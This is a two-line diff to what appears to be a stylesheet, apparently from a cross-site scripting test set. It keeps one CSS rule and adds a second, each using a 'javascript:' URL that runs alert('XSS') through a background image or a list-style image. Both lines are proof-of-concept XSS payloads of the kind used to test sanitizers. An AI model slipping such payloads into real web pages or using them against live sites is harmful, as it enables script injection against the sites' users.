@@ -1,1 +1,2 @@
 body {background:url("javascript:alert('XSS')")}
+li {list-style-image: url("javascript:alert('XSS')");}
